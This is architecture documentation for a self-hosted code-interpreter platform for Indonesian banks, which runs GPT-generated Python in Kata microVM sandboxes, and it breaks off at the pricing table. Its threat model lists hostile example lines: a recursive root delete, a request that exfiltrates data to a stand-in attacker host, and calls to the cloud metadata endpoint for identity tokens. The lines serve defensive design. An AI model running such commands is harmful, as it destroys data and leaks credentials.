# Code Interpreter Platform — Solution Documentation

## Table of Contents

1. [What Is This Solution](#1-what-is-this-solution)
2. [Why This Solution — Comparison with Foundry Code Interpreter](#2-why-this-solution--comparison-with-foundry-code-interpreter)
3. [High-Level Architecture](#3-high-level-architecture)
4. [Low-Level Architecture](#4-low-level-architecture)
5. [Detailed Flow — How It Works](#5-detailed-flow--how-it-works)
6. [Component Deep Dive with Code](#6-component-deep-dive-with-code)
7. [Infrastructure as Code](#7-infrastructure-as-code)
8. [Security Considerations](#8-security-considerations)
9. [Pricing Estimation](#9-pricing-estimation)
10. [Deployment Guide](#10-deployment-guide)

---

## 1. What Is This Solution

A **self-hosted, end-to-end Code Interpreter platform** for the banking industry (Indonesia). It allows bank analysts to upload data (CSV/XLSX), ask questions in natural language, and receive automated analysis with charts, tables, and written insights — all executed in a secure, isolated sandbox environment.

**Key capabilities:**
- Upload banking datasets (transactions, loans, branch KPIs)
- Ask natural-language questions ("Identify unusual transactions", "Which loans are high risk?")
- LLM (GPT-4.1) generates Python analysis code automatically
- Code executes in an isolated microVM sandbox (Kata Containers on AKS)
- Results include charts (PNG), data tables (CSV), and markdown explanations
- Full audit trail of every prompt, code executed, and result

**Target users:** Bank analysts, risk officers, compliance teams in Indonesian banking institutions.

---

## 2. Why This Solution — Comparison with Foundry Code Interpreter

### The Problem with Azure AI Foundry Code Interpreter

| Aspect | Foundry Code Interpreter | This Solution |
|--------|--------------------------|---------------|
| **Availability** | Limited preview; not GA in all regions | Fully self-hosted; deploy anywhere AKS runs |
| **Indonesia data residency** | Not available in Indonesia Central | All compute + storage in Indonesia Central |
| **Isolation model** | Shared managed service; opaque security boundary | Dedicated Kata VM (microVM) per execution; separate kernel |
| **Customization** | Fixed Python environment; limited packages | Full control over packages, libraries, versions |
| **Audit & compliance** | Limited audit capabilities | Full audit log: prompt, code, output, timing, user ID |
| **LLM flexibility** | Tied to Foundry models | Pluggable LLM adapter — swap Azure OpenAI, add Bedrock, etc. |
| **Network controls** | Cannot restrict outbound from sandbox | Full NetworkPolicy: block egress, block IMDS, allow only Blob Storage |
| **Cost transparency** | Opaque per-session pricing | Transparent: AKS node hours + LLM tokens + storage |
| **Banking compliance (OJK/BI)** | May not meet Indonesian banking regulator requirements | Designed for banking: data residency, audit trail, isolation |

### What This Solution Tackles

1. **Data sovereignty** — All data stored and processed in Indonesia Central. LLM inference in Southeast Asia (closest available for GPT-4.1). No data leaves the Asia-Pacific region.

2. **Strong isolation** — Each code execution runs in a Kata Container (microVM) with its own kernel. Even if LLM-generated code is malicious, it cannot escape the VM boundary, access other workloads, or reach the host kernel.

3. **Banking-grade audit** — Every execution is logged: who asked what, what code was generated, what ran, what it produced, how long it took. Stored in immutable blob storage for compliance review.

4. **Zero-trust sandbox** — Sandbox pods have: no cloud credentials, no managed identity, no service account tokens, no outbound internet (except Blob Storage via SAS tokens), blocked Azure IMDS, CPU/memory/time limits.

5. **LLM vendor flexibility** — The `LLMProvider` interface allows swapping Azure OpenAI for any other provider without changing the rest of the system.

---

## 3. High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                         USER (Browser)                              │
│                     http://<ingress-ip>                              │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                    ┌──────┴──────┐
                    │   NGINX     │
                    │   Ingress   │
                    │  Controller │
                    └──┬──────┬───┘
                /      │      │  /api
                       │      │
              ┌────────┘      └────────┐
              ▼                        ▼
    ┌──────────────────┐    ┌──────────────────────┐
    │    Frontend       │    │    Backend (API)      │
    │    Next.js        │    │    FastAPI             │
    │    Port 3000      │    │    Port 8000           │
    │                   │    │                        │
    │  • Chat UI        │    │  • Upload handler      │
    │  • File upload    │    │  • LLM orchestrator    │
    │  • Chart display  │    │  • Sandbox manager     │
    │  • Activity log   │    │  • Storage service     │
    └──────────────────┘    └────┬────────┬──────────┘
                                 │        │
                    ┌────────────┘        └──────────────┐
                    ▼                                     ▼
         ┌──────────────────┐              ┌──────────────────────┐
         │  Azure OpenAI     │              │  AKS Sandbox Pod     │
         │  (GPT-4.1)        │              │  (Kata VM Isolation)  │
         │  SE Asia region   │              │  Ephemeral, no creds  │
         │                   │              │                       │
         │  • Code generation│              │  • Runs Python code   │
         │  • Result explain │              │  • Reads data (SAS)   │
         └──────────────────┘              │  • Writes results     │
                                            └───────────┬───────────┘
                                                        │
                                            ┌───────────┴───────────┐
                                            │   Azure Blob Storage   │
                                            │   Indonesia Central    │
                                            │                        │
                                            │  📁 datasets/          │
                                            │  📁 outputs/           │
                                            │  📁 audit-logs/        │
                                            └────────────────────────┘
```

### Azure Resources Deployed

| Resource | Purpose | Region | SKU |
|----------|---------|--------|-----|
| **AKS Cluster** | Runs all workloads | Indonesia Central | Standard |
| **System Node Pool** | Frontend + Backend + Ingress + system pods | Indonesia Central | Standard_D2s_v3 (1 node) |
| **Sandbox Node Pool** | Kata VM sandbox pods | Indonesia Central | Standard_D4s_v3 (0-3, autoscale) |
| **Azure Container Registry** | Docker images | Indonesia Central | Standard |
| **Azure Blob Storage** | Datasets, outputs, audit logs | Indonesia Central | Standard_LRS |
| **Azure OpenAI** | LLM inference (GPT-4.1) | Southeast Asia (existing) | S0 / Global Standard |
| **Log Analytics** | Container monitoring | Indonesia Central | Per-GB |

---

## 4. Low-Level Architecture

### 4.1 AKS Cluster Topology

```
┌─── AKS Cluster (K8s 1.33) ──────────────────────────────────────────────┐
│                                                                           │
│  ┌─── System Pool: 1× Standard_D2s_v3 (2 vCPU, 8 GB) ─── Always On ──┐ │
│  │                                                                     │ │
│  │  Namespace: ingress-nginx                                           │ │
│  │    └─ nginx-ingress-controller (Deployment, 1 replica)              │ │
│  │       Routes: / → frontend:3000, /api → backend:8000               │ │
│  │                                                                     │ │
│  │  Namespace: codeinterpreter                                         │ │
│  │    ├─ backend (Deployment, 1 replica, 2 uvicorn workers)            │ │
│  │    │   ServiceAccount: orchestrator-sa                              │ │
│  │    │   Labels: azure.workload.identity/use=true                     │ │
│  │    │   EnvFrom: backend-config (ConfigMap), backend-secrets (Secret)│ │
│  │    │                                                                │ │
│  │    └─ frontend (Deployment, 1 replica)                              │ │
│  │        Standalone Next.js server                                    │ │
│  │                                                                     │ │
│  │  Namespace: kube-system                                             │ │
│  │    └─ coredns, metrics-server, CSI drivers, omsagent                │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
│                                                                           │
│  ┌─── Sandbox Pool: 0-3× Standard_D4s_v3 (4 vCPU, 16 GB) ─ Scale 0 ──┐ │
│  │  workloadRuntime: KataMshvVmIsolation                               │ │
│  │  nodeTaints: sandbox=true:NoSchedule                                │ │
│  │  nodeLabels: workload-type=sandbox                                  │ │
│  │                                                                     │ │
│  │  Namespace: sandbox                                                 │ │
│  │    ├─ NetworkPolicy: deny-all-egress (block everything)             │ │
│  │    ├─ NetworkPolicy: allow-storage-egress (DNS + HTTPS:443 only)    │ │
│  │    ├─ NetworkPolicy: deny-all-ingress (no inbound connections)      │ │
│  │    ├─ NetworkPolicy: block-metadata (169.254.169.254 blocked)       │ │
│  │    │                                                                │ │
│  │    └─ sandbox-<exec-id> (Job, ephemeral)                            │ │
│  │        runtimeClassName: kata-vm-isolation                          │ │
│  │        activeDeadlineSeconds: 600                                   │ │
│  │        automountServiceAccountToken: false                          │ │
│  │        Resources: 500m-1 CPU, 512Mi-1Gi memory                     │ │
│  │        Tolerations: sandbox=true:NoSchedule                         │ │
│  │        NodeSelector: agentpool=sandboxpool                          │ │
│  └─────────────────────────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────────────────────────┘
```

### 4.2 Identity & Authentication Flow

```
┌────────────────────────────────────────────────────────────────────────┐
│                     Identity Architecture                              │
│                                                                        │
│  Backend Pod                                                           │
│    │                                                                   │
│    ├─ ServiceAccount: orchestrator-sa                                  │
│    │   ├─ Label: azure.workload.identity/use=true                     │
│    │   └─ Annotation: azure.workload.identity/client-id=<MI-ID>       │
│    │                                                                   │
│    ├─ Workload Identity Federation                                     │
│    │   ├─ User-Assigned Managed Identity: ci-backend-identity          │
│    │   ├─ Federated Credential links K8s SA ↔ Azure MI                │
│    │   └─ OIDC Issuer: AKS cluster OIDC endpoint                     │
│    │                                                                   │
│    ├─ Azure Roles:                                                     │
│    │   └─ Storage Blob Data Contributor → Storage Account              │
│    │                                                                   │
│    └─ Injected Env Vars (by AKS Workload Identity webhook):           │
│        ├─ AZURE_CLIENT_ID                                              │
│        ├─ AZURE_TENANT_ID                                              │
│        ├─ AZURE_FEDERATED_TOKEN_FILE                                   │
│        └─ AZURE_AUTHORITY_HOST                                         │
│                                                                        │
│  Sandbox Pod                                                           │
│    ├─ NO ServiceAccount token mounted                                  │
│    ├─ NO managed identity                                              │
│    ├─ NO cloud credentials                                             │
│    └─ Only: short-lived SAS tokens (30 min, container-scoped)          │
│        ├─ AZURE_STORAGE_SAS_URL → datasets container (read-only)       │
│        └─ OUTPUT_SAS_URL → outputs container (read+write)              │
└────────────────────────────────────────────────────────────────────────┘
```

### 4.3 Data Flow Diagram

```
┌──────────────┐       ┌──────────────┐       ┌──────────────────────┐
│   Browser     │       │   Ingress    │       │   Backend (FastAPI)   │
│              │──(1)──▶│  NGINX       │──────▶│                       │
│  Upload CSV  │  POST  │  /api/upload │       │  routes/upload.py     │
│              │◀──(2)──│              │◀──────│  → storage.upload()   │
│  {session_id}│        │              │       │  → Blob: datasets/    │
└──────────────┘        └──────────────┘       └──────────────────────┘

┌──────────────┐       ┌──────────────┐       ┌──────────────────────┐
│   Browser     │       │   Ingress    │       │   Backend (FastAPI)   │
│              │──(3)──▶│  NGINX       │──────▶│                       │
│  Ask question│  POST  │  /api/chat   │       │  routes/chat.py       │
│              │        │              │       │  → orchestrator.py    │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2a ──────┐ │
│              │        │              │       │  │ Read data preview│ │
│              │        │              │       │  │ from Blob Storage│ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2b ──────┐ │
│              │        │              │       │  │ Call Azure OpenAI│ │
│              │        │              │       │  │ gpt-4.1          │ │
│              │        │              │       │  │ "Generate Python │ │
│              │        │              │       │  │  analysis code"  │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2c ──────┐ │
│              │        │              │       │  │ Extract Python   │ │
│              │        │              │       │  │ code from LLM    │ │
│              │        │              │       │  │ response         │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2d ──────┐ │
│              │        │              │       │  │ Generate SAS     │ │
│              │        │              │       │  │ tokens (30 min)  │ │
│              │        │              │       │  │ datasets: read   │ │
│              │        │              │       │  │ outputs: write   │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2e ──────┐ │
│              │        │              │       │  │ Create K8s Job   │ │
│              │        │              │       │  │ in sandbox ns    │ │
│              │        │              │       │  │ kata-vm-isolation│ │
│              │        │              │       │  └────────┬─────────┘ │
│              │        │              │       │           │           │
│              │        │              │       │           ▼           │
│              │        │              │       │  ┌──────────────────┐ │
│              │        │              │       │  │ Sandbox Pod      │ │
│              │        │              │       │  │ (Kata microVM)   │ │
│              │        │              │       │  │                  │ │
│              │        │              │       │  │ 1. Download CSV  │ │
│              │        │              │       │  │    via SAS token │ │
│              │        │              │       │  │ 2. exec(code)    │ │
│              │        │              │       │  │ 3. Upload PNG/CSV│ │
│              │        │              │       │  │ 4. Upload        │ │
│              │        │              │       │  │    manifest.json │ │
│              │        │              │       │  └────────┬─────────┘ │
│              │        │              │       │           │           │
│              │        │              │       │  ┌─── Step 2f ──────┐ │
│              │        │              │       │  │ Read manifest    │ │
│              │        │              │       │  │ + result files   │ │
│              │        │              │       │  │ from Blob        │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2g ──────┐ │
│              │        │              │       │  │ Call Azure OpenAI│ │
│              │        │              │       │  │ "Explain these   │ │
│              │        │              │       │  │  results to the  │ │
│              │        │              │       │  │  bank analyst"   │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │        │              │       │  ┌─── Step 2h ──────┐ │
│              │        │              │       │  │ Write audit log  │ │
│              │        │              │       │  │ to Blob          │ │
│              │        │              │       │  │ audit-logs/ dir  │ │
│              │        │              │       │  └──────────────────┘ │
│              │        │              │       │                       │
│              │◀──(4)──│              │◀──────│  Return:              │
│ Show results │  JSON  │              │       │  • explanation (md)   │
│ + charts     │        │              │       │  • code (python)      │
│              │        │              │       │  • output_files (urls)│
└──────────────┘        └──────────────┘       └──────────────────────┘
```

---

## 5. Detailed Flow — How It Works

### 5.1 Upload Flow

```
User drags CSV into browser
  → Frontend: FileUpload.tsx → api.ts uploadFile()
    → POST /api/upload (multipart/form-data)
      → Backend: routes/upload.py
        → Validates file type (.csv, .xlsx) and size (≤50 MB)
        → Generates session_id (UUID v4)
        → storage.upload_dataset() → Blob: datasets/{session_id}/{filename}
        → Returns: { session_id, blob_path, filename, size_bytes }
      → Frontend stores session_id + blob_path in state
      → Shows "Dataset uploaded: transactions.csv (0.7 KB)"
```

### 5.2 Chat/Analysis Flow (the core pipeline)

```
User types: "Identify unusual transactions based on amount"
  → Frontend: page.tsx handleSend()
    → Shows activity log: "Received prompt, starting analysis pipeline..."
    → POST /api/chat { prompt, dataset_blob, session_id }
      → Backend: routes/chat.py → orchestrator.process_chat()

        Step 1: DATA PREVIEW
        → storage.get_data_preview(blob_path, max_rows=10)
        → Downloads first 11 lines of CSV from Blob
        → Returns: "transaction_id,account_id,amount,...\nT001,A123,150000,..."

        Step 2: LLM CODE GENERATION (1st LLM call)
        → llm.generate(CODE_GEN_SYSTEM_PROMPT, user_prompt, {data_preview})
        → Sends to Azure OpenAI GPT-4.1:
            System: "You are a data analyst. Write Python code..."
            User: "Here is a preview: [CSV header + 10 rows]"
            User: "Identify unusual transactions based on amount"
        → LLM returns markdown with ```python code block
        → extract_code() → regex extracts Python code

        Step 3: SAS TOKEN GENERATION
        → storage.get_sandbox_sas_tokens()
        → Uses Workload Identity → DefaultAzureCredential
        → Gets User Delegation Key from Blob service
        → Generates container-scoped SAS tokens (30 min expiry):
            datasets container: read + list
            outputs container: read + write + create

        Step 4: SANDBOX EXECUTION
        → sandbox.create_execution(code, input_blob, sas_tokens)
        → Creates K8s Job in 'sandbox' namespace:
            runtimeClassName: kata-vm-isolation (microVM)
            image: code-interpreter-sandbox:latest
            env: CODE_BASE64, INPUT_BLOB, SAS URLs
            limits: 1 CPU, 1Gi memory
            timeout: 600 seconds
            nodeSelector: sandboxpool
            tolerations: sandbox=true

        → Sandbox Pod runs executor.py:
            1. Downloads CSV from Blob via SAS token
            2. exec(code) with DATA_PATH and OUTPUT_DIR variables
            3. Captures stdout/stderr
            4. Uploads output files (PNG charts, CSV tables) to Blob
            5. Uploads manifest.json to Blob

        Step 5: WAIT FOR COMPLETION
        → sandbox.wait_for_completion(execution_id)
        → Polls K8s Job status every 2 seconds
        → Reads pod logs on completion

        Step 6: COLLECT RESULTS
        → storage.get_execution_manifest(execution_id)
        → Downloads manifest.json from Blob outputs/
        → For each output file, generate SAS URL for browser access

        Step 7: LLM EXPLANATION (2nd LLM call)
        → llm.generate(EXPLAIN_SYSTEM_PROMPT, {code, stdout, files})
        → Sends to Azure OpenAI:
            "The user asked X. Code produced Y. Explain findings."
        → LLM returns markdown explanation

        Step 8: AUDIT LOG
        → storage.write_audit_log({prompt, code, status, stdout, files})
        → Stored in Blob: audit-logs/YYYY/MM/DD/HH/{exec_id}.json

      → Returns JSON: { execution_id, status, code, explanation, output_files[] }
    → Frontend renders:
        • Markdown explanation with key findings
        • Expandable code block (View generated code)
        • Embedded chart images (PNG via SAS URLs)
        • Download links for CSV results
```

### 5.3 Sandbox Execution Detail

```
┌─── Kata MicroVM (separate kernel) ───────────────────────────────┐
│                                                                   │
│  Kernel: 6.6.121.mshv1  (isolated from host 6.6.126.1)           │
│                                                                   │
│  User: sandboxuser (non-root)                                    │
│  Working dir: /sandbox                                           │
│                                                                   │
│  executor.py runs:                                                │
│                                                                   │
│  1. Read env vars:                                                │
│     - CODE_BASE64 (Python code, base64 encoded)                  │
│     - AZURE_STORAGE_SAS_URL (datasets container + SAS)            │
│     - OUTPUT_SAS_URL (outputs container + SAS)                    │
│     - INPUT_BLOB (e.g., "session-id/transactions.csv")            │
│     - EXECUTION_ID (UUID)                                         │
│                                                                   │
│  2. Download: ContainerClient.get_blob_client(INPUT_BLOB)        │
│     → /sandbox/input_data.csv                                    │
│                                                                   │
│  3. exec(code, globals={DATA_PATH, OUTPUT_DIR})                  │
│     → Code runs with pandas, numpy, matplotlib, seaborn           │
│     → stdout/stderr captured via redirect                         │
│     → Charts saved to /sandbox/outputs/chart.png                  │
│     → Tables saved to /sandbox/outputs/results.csv                │
│                                                                   │
│  4. Upload outputs to Blob via OUTPUT_SAS_URL:                    │
│     outputs/{exec-id}/chart.png                                   │
│     outputs/{exec-id}/results.csv                                 │
│     outputs/{exec-id}/manifest.json                               │
│                                                                   │
│  5. Print manifest JSON to stdout (pod logs backup)               │
│                                                                   │
│  Network: Only DNS (53) + HTTPS (443) to Blob Storage             │
│  Blocked: All other egress, all ingress, IMDS (169.254.169.254)   │
│  Lifetime: Destroyed after completion + 5 min TTL                 │
└───────────────────────────────────────────────────────────────────┘
```

---

## 6. Component Deep Dive with Code

### 6.1 LLM Adapter Pattern (`src/backend/app/llm/provider.py`)

Pluggable LLM backend — swap providers without changing orchestration logic.

```python
class LLMProvider(ABC):
    """Abstract base class for LLM providers."""
    @abstractmethod
    def generate(self, system_prompt, user_prompt, context=None) -> LLMResponse:
        ...

class AzureOpenAIProvider(LLMProvider):
    """Azure OpenAI implementation using the official SDK."""
    def __init__(self):
        self.client = AzureOpenAI(
            azure_endpoint=settings.azure_openai_endpoint,  # AI Foundry endpoint
            api_key=settings.azure_openai_key,
            api_version="2024-12-01-preview",
        )
        self.deployment = settings.azure_openai_deployment   # "gpt-4.1"

    def generate(self, system_prompt, user_prompt, context=None) -> LLMResponse:
        messages = [{"role": "system", "content": system_prompt}]
        if context and context.get("data_preview"):
            messages.append({"role": "user", "content": f"Data preview:\n{context['data_preview']}"})
        messages.append({"role": "user", "content": user_prompt})

        response = self.client.chat.completions.create(
            model=self.deployment,
            messages=messages,
            temperature=0.1,      # Low temp for deterministic code
            max_tokens=4096,
        )
        return LLMResponse(content=..., model=..., usage=...)

# Factory — add new providers here
def get_llm_provider() -> LLMProvider:
    providers = {"azure": AzureOpenAIProvider}  # Add "bedrock", "anthropic", etc.
    return providers[settings.llm_provider]()
```

**To add a new provider** (e.g., AWS Bedrock):
1. Create `class BedrockProvider(LLMProvider)` implementing `generate()`
2. Register in the `providers` dict: `"bedrock": BedrockProvider`
3. Set `LLM_PROVIDER=bedrock` environment variable

### 6.2 Orchestrator (`src/backend/app/orchestrator.py`)

The brain — coordinates the entire pipeline. Two LLM calls per request:

```python
async def process_chat(user_prompt, dataset_blob, session_id):
    # Step 1: Get data schema/preview from Blob
    data_preview = storage_service.get_data_preview(dataset_blob)

    # Step 2: LLM generates Python code (1st call)
    code_response = llm.generate(CODE_GEN_SYSTEM_PROMPT, user_prompt, {"data_preview": data_preview})
    code = extract_code(code_response.content)  # Regex: ```python ... ```

    # Step 3: Generate short-lived SAS tokens for sandbox
    sas_tokens = storage_service.get_sandbox_sas_tokens()  # 30-min, container-scoped

    # Step 4: Create K8s Job with Kata VM isolation
    sandbox_service.create_execution(code, dataset_blob, account_url, sas_tokens, execution_id)

    # Step 5: Poll for completion (every 2s, up to 600s timeout)
    result = sandbox_service.wait_for_completion(execution_id)

    # Step 6: Read execution manifest from Blob
    manifest = storage_service.get_execution_manifest(execution_id)

    # Step 7: LLM explains the results (2nd call)
    explain_response = llm.generate(EXPLAIN_SYSTEM_PROMPT, f"Code ran: {code}\nOutput: {stdout}")

    # Step 8: Write audit log
    storage_service.write_audit_log({prompt, code, status, stdout, output_files})

    return {execution_id, status, code, explanation, output_files}
```

### 6.3 Sandbox Service (`src/backend/app/sandbox.py`)

Creates Kubernetes Jobs that run in microVM-isolated pods:

```python
class SandboxService:
    def create_execution(self, code, input_blob, storage_account_url, sas_tokens, execution_id):
        job = client.V1Job(
            spec=V1JobSpec(
                ttl_seconds_after_finished=300,        # Auto-cleanup after 5 min
                active_deadline_seconds=600,           # Kill after 10 min
                backoff_limit=0,                       # No retries
                template=V1PodTemplateSpec(
                    spec=V1PodSpec(
                        runtime_class_name="kata-vm-isolation",   # ← microVM
                        restart_policy="Never",
                        automount_service_account_token=False,    # No K8s creds
                        node_selector={"agentpool": "sandboxpool"},
                        tolerations=[{key: "sandbox", value: "true", effect: "NoSchedule"}],
                        containers=[V1Container(
                            image=settings.sandbox_image,
                            env=[
                                V1EnvVar("AZURE_STORAGE_SAS_URL", datasets_sas_url),  # read-only
                                V1EnvVar("OUTPUT_SAS_URL", outputs_sas_url),          # write
                                V1EnvVar("CODE_BASE64", base64_encoded_code),
                                V1EnvVar("INPUT_BLOB", input_blob),
                                V1EnvVar("EXECUTION_ID", execution_id),
                            ],
                            resources=V1ResourceRequirements(
                                limits={"cpu": "1", "memory": "1Gi"},
                            ),
                        )],
                    ),
                ),
            ),
        )
        self.batch_v1.create_namespaced_job(namespace="sandbox", body=job)
```

### 6.4 Storage Service (`src/backend/app/storage.py`)

Uses **Managed Identity** (Workload Identity) — no storage keys. Generates short-lived SAS tokens for sandbox pods:

```python
class StorageService:
    @property
    def client(self) -> BlobServiceClient:
        # Uses DefaultAzureCredential → Workload Identity → Entra ID token
        account_url = f"https://{settings.azure_storage_account_name}.blob.core.windows.net"
        return BlobServiceClient(account_url, credential=DefaultAzureCredential())

    def get_sandbox_sas_tokens(self) -> dict:
        # User-delegation SAS — signed by Entra ID, not account key
        delegation_key = self.client.get_user_delegation_key(...)

        datasets_sas = generate_container_sas(
            container_name="datasets",
            user_delegation_key=delegation_key,
            permission=ContainerSasPermissions(read=True, list=True),  # read-only
            expiry=now + 30min,
        )
        outputs_sas = generate_container_sas(
            container_name="outputs",
            user_delegation_key=delegation_key,
            permission=ContainerSasPermissions(read=True, write=True), # read+write
            expiry=now + 30min,
        )
        return {"datasets": datasets_sas, "outputs": outputs_sas}
```

### 6.5 Sandbox Executor (`src/sandbox/executor.py`)

Runs inside the Kata microVM — minimal attack surface:

```python
def execute_code(code: str, data_path: str) -> dict:
    """Execute untrusted code with captured I/O."""
    exec_globals = {
        "__builtins__": __builtins__,   # Standard Python builtins
        "DATA_PATH": data_path,         # e.g., "/sandbox/input_data.csv"
        "OUTPUT_DIR": "/sandbox/outputs",
    }
    with redirect_stdout(capture), redirect_stderr(capture):
        exec(code, exec_globals)  # Runs LLM-generated code
    return {"success": True/False, "stdout": ..., "stderr": ...}

def main():
    # 1. Download input via SAS token (container-scoped, 30-min expiry)
    input_client = ContainerClient.from_container_url(sas_url)
    blob = input_client.get_blob_client(input_blob)
    blob.download_blob().readall() → /sandbox/input_data.csv

    # 2. Execute code
    result = execute_code(code, "/sandbox/input_data.csv")

    # 3. Upload results via separate SAS token (write permission)
    output_client = ContainerClient.from_container_url(output_sas_url)
    output_client.upload_blob("chart.png", ...)
    output_client.upload_blob("manifest.json", ...)
```

### 6.6 Frontend Activity Log (`src/frontend/src/app/page.tsx`)

Shows real-time pipeline progress with auto-scrolling timestamps:

```typescript
const handleSend = async () => {
    addActivity('Received prompt, starting analysis pipeline...');
    setTimeout(() => addActivity('Reading dataset preview from Azure Blob...'), 800);
    setTimeout(() => addActivity('Sending prompt to Azure OpenAI (gpt-4.1)...'), 2000);
    setTimeout(() => addActivity('LLM generating Python analysis code...'), 4000);
    setTimeout(() => addActivity('Creating sandbox pod (Kata VM isolation)...'), 8000);
    setTimeout(() => addActivity('Sandbox executing Python code...'), 15000);

    const response = await sendChat(prompt, datasetBlob, sessionId);

    addActivity(`Code generated: ${response.code.split('\n').length} lines`);
    addActivity('Analysis complete', 'done');
};
```

---

## 7. Infrastructure as Code

### 7.1 Bicep Module Structure

```
infra/
├── main.bicep                    # Entry point — wires all modules
│   ├── Parameters:
│   │   ├── baseName              # Resource name prefix
│   │   ├── primaryLocation       # "indonesiacentral"
│   │   ├── existingOpenAiEndpoint # Skip creating new OpenAI if set
│   │   └── environment           # dev / staging / prod
│   │
│   ├── Modules:
│   │   ├── monitoring → Log Analytics workspace
│   │   ├── acr → Azure Container Registry
│   │   ├── storage → Blob Storage (datasets, outputs, audit-logs)
│   │   ├── openai → Azure OpenAI + GPT-4.1 (conditional)
│   │   └── aks → AKS cluster + system pool + sandbox pool
│   │
│   └── Outputs:
│       ├── aksClusterName, acrLoginServer, storageAccountName
│       ├── openAiEndpoint, openAiDeploymentName
│       └── openAiCreated (bool — was a new resource created?)
│
└── modules/
    ├── aks.bicep        # System pool (D2s_v3×1) + Sandbox pool (D4s_v3×0-3, Kata)
    ├── acr.bicep        # Standard SKU, admin enabled
    ├── storage.bicep    # Standard_LRS, 3 containers, versioning
    ├── openai.bicep     # S0, GPT-4.1 Global Standard deployment
    └── monitoring.bicep # PerGB2018, 30-day retention
```

### 7.2 Key Bicep Decision: Conditional OpenAI

```bicep
// If user provides existing endpoint, skip creating new OpenAI resource
var deployOpenAi = empty(existingOpenAiEndpoint)

module openai 'modules/openai.bicep' = if (deployOpenAi) { ... }

output openAiEndpoint string = deployOpenAi
    ? openai!.outputs.openAiEndpoint
    : existingOpenAiEndpoint
```

---

## 8. Security Considerations

### 8.1 Threat Model

| Threat | Attack Vector | Mitigation |
|--------|---------------|------------|
| **LLM generates malicious code** | Code does `os.system('rm -rf /')` or tries to exfiltrate data | Kata microVM with separate kernel; non-root user; ephemeral (destroyed after execution); resource limits |
| **Sandbox escapes to host** | Kernel exploit from container to node | Kata VM provides kernel-level isolation (not just namespace/cgroup). Sandbox has its own kernel (6.6.121.mshv1) separate from host (6.6.126.1) |
| **Sandbox accesses Azure IMDS** | Code calls `169.254.169.254` to get node identity tokens | NetworkPolicy blocks 169.254.169.254 explicitly |
| **Sandbox calls external APIs** | Code does `requests.get("https://evil.com/exfiltrate")` | Default deny-all egress NetworkPolicy. Only DNS (53) + HTTPS (443) to Azure Blob are allowed |
| **Sandbox accesses other K8s services** | Code tries to reach backend or kube-apiserver | deny-all-ingress + deny-all-egress network policies on sandbox namespace. No service account token mounted |
| **Sandbox gets cloud credentials** | Code reads env vars or mounted secrets | `automountServiceAccountToken: false`. No managed identity. Only SAS tokens (30-min expiry, container-scoped) |
| **SAS token misuse** | Sandbox uses SAS to access wrong containers | Container-scoped SAS: datasets SAS = read-only; outputs SAS = write only to outputs/ container. Cannot access audit-logs or other storage |
| **Data exfiltration via Blob** | Sandbox uploads sensitive data to outputs/ then attacker reads it | Blob Storage has no public access. Output files accessible only via user-delegation SAS generated per-request |
| **Prompt injection** | User crafts prompt to make LLM generate bypass code | Sandbox isolation is the defense-in-depth. Even if LLM is tricked, the sandbox cannot escape |
| **Storage key theft** | Attacker compromises backend pod environment | Storage key auth disabled by policy (shared key access = false). Backend uses Workload Identity (Entra ID tokens, auto-rotated) |
| **OpenAI key leakage** | API key exposed in pod environment | Stored in K8s Secret (encrypted at rest). Future: move to Azure Key Vault with CSI driver |
| **Unauthorized access to platform** | Anyone can access the Ingress IP | Currently open (MVP). Future: Entra ID SSO integration for user authentication |

### 8.2 Security Architecture Summary

```
┌─────────── TRUSTED ZONE ──────────────────────────────────────────┐
│                                                                    │
│  Backend Pod:                                                      │
│  ├─ Has: Workload Identity (auto-rotated Azure AD tokens)         │
│  ├─ Has: OpenAI API key (K8s Secret, encrypted at rest)            │
│  ├─ Has: RBAC to create Jobs in sandbox namespace                  │
│  ├─ Can: Read/Write all Blob containers                           │
│  └─ Can: Call Azure OpenAI API                                     │
│                                                                    │
│  Frontend Pod:                                                     │
│  ├─ Has: Nothing — pure static server                             │
│  └─ Cannot: Access any backend service directly                    │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘

┌─────────── UNTRUSTED ZONE ────────────────────────────────────────┐
│                                                                    │
│  Sandbox Pod (Kata microVM):                                       │
│  ├─ Has: Short-lived SAS tokens only (30 min, container-scoped)    │
│  ├─ Cannot: Access Azure IMDS (blocked by NetworkPolicy)           │
│  ├─ Cannot: Reach internet (deny-all egress)                       │
│  ├─ Cannot: Reach other K8s services (deny-all ingress/egress)     │
│  ├─ Cannot: Mount K8s secrets (automount disabled)                │
│  ├─ Cannot: Run as root (sandboxuser, non-root)                   │
│  ├─ Cannot: Exceed 1 CPU / 1Gi memory / 10 min runtime            │
│  └─ Runs: Separate kernel from host node                          │
│                                                                    │
└────────────────────────────────────────────────────────────────────┘
```

### 8.3 Compliance Considerations (Indonesian Banking — OJK/BI)

| Requirement | How This Solution Addresses It |
|-------------|-------------------------------|
| **Data residency** | All compute + storage in Indonesia Central. LLM inference in SE Asia (Singapore) — confirm with OJK if acceptable |
| **Audit trail** | Every execution logged: prompt, generated code, output, status, timestamp. Stored in Blob with versioning |
| **Access control** | Currently open (MVP). Production: add Entra ID SSO, RBAC per user/group |
| **Encryption at rest** | Azure Storage: Microsoft-managed keys (default). Upgrade to CMK for banking |
| **Encryption in transit** | All traffic over HTTPS (TLS 1.2+). Internal cluster traffic: Azure CNI with network policies |
| **Incident investigation** | Audit logs include execution_id, session_id for tracing. Log Analytics for infrastructure logs |
| **Segregation of duties** | Separate namespaces: codeinterpreter (trusted), sandbox (untrusted). RBAC limits backend SA to Job management only |

---

## 9. Pricing Estimation

### 9.1 Monthly Cost Breakdown (Dev/POC)

| Resource | SKU | Quantity | Unit Price | Monthly Cost |
